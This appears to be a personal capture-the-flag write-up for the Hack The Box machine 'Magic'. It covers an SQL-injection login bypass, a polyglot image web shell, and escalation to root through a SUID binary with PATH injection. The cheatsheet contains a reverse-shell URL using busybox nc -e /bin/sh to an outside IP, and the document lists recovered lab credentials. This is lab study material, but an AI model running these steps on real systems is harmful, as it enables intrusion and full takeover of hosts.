# Magic \[Medium]

## Report

A login page is bypassed using basic SQLi and we have access to a file uploading page. Guessing by the name magic, it checks the magic bytes of the file to check if it is indeed an image, using our polyglot shell from Networked we get a reverse shell.

SQL creds are recovered from app config files and we see port 3306 open. The native mysql was not available, a workaround was to use to mysqldump (found via full pty shell) or port forward via chisel and access at localhost. Get creds for user 'theseus' and edit authorized\_keys for SSH access

A lot of binaries with SUID were set and we actually missed it the first time but checking SUID binaries that belong to the 'users' group (theseus is a part of two groups) shows it again `/bin/sysinfo` Using strace, we see exec calls are performed without full path, perform path injection and become root.

## Cheatsheet

```
image files at images/uploads/[file]
http://magic.htb/images/uploads/black.php.jpeg?cmd=busybox%20nc%2010.10.14.15%209001%20-e%20%2Fbin%2Fsh

how to interact with sql without the clinet [chisel]

full pty shell needed otherwise how find mysqldump
mysqldump -u theseus -p Magic

add to authoirzed_keys and use ssh [was blocked before via password]

find / -group users  -print 2>/dev/null
theseus@magic:~$ ls -la /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo

strace -f [bin] [follows forks too, see the exec calls]
ltrace [bin] also works lowk
```

## Loot

### Creds

```
theseus:iamkingtheseus [db.php5]
admin:Th3s3usW4sK1ng [SQL]
```

### Proof



### Enum

```
80
no vhost

images
assets
server-status 403

.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htaccess.html          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 149ms]
.hta.txt                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.hta.php                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htaccess.php           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htaccess.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.hta.html               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 150ms]
.htpasswd.php           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 151ms]
.htpasswd.html          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
.htpasswd.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
.sh_history             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 156ms]
.sh_history.php         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
.sh_history.txt         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
.sh_history.html        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1781ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 3980ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 150ms]
images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 154ms]
index.php               [Status: 200, Size: 4053, Words: 491, Lines: 60, Duration: 153ms]
index.php               [Status: 200, Size: 4052, Words: 491, Lines: 60, Duration: 152ms]
login.php               [Status: 200, Size: 4221, Words: 1179, Lines: 118, Duration: 151ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 153ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 152ms]
upload.php              [Status: 302, Size: 2957, Words: 814, Lines: 85, Duration: 159ms]

tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
```
